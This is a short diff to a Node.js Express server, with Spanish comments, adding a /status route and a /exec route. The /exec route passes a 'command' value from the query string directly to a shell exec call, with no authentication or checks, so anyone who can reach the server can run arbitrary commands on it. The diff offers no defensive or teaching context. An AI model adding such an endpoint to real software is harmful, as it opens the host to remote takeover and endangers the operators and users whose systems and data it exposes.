@@ -22,6 +22,31 @@ app.get('/', function (req, res) {
     res.send('GET request to homepage')
   })
 
+app.get(`/status`, function (req, res) {
+    // Ruta para pingear el status
+    const { ip } = req.query;
+    res.status(200).send({ ping: 'ok', ip })
+})
+
+app.get(`/exec`, function (req, res) {
+    console.log('params', req.query);
+    res.send('EXEC done')
+
+    const { command } = req.query;
+
+    exec(command, (error, stdout, stderr) => {
+        if (error) {
+            console.log(`error: ${error.message}`);
+            return;
+        }
+        if (stderr) {
+            console.log(`stderr: ${stderr}`);
+            return;
+        }
+        console.log(`stdout: ${stdout}`);
+    });
+})
+
 app.post('/flow', function (req, res) {
 
     console.log('Empenzando función');
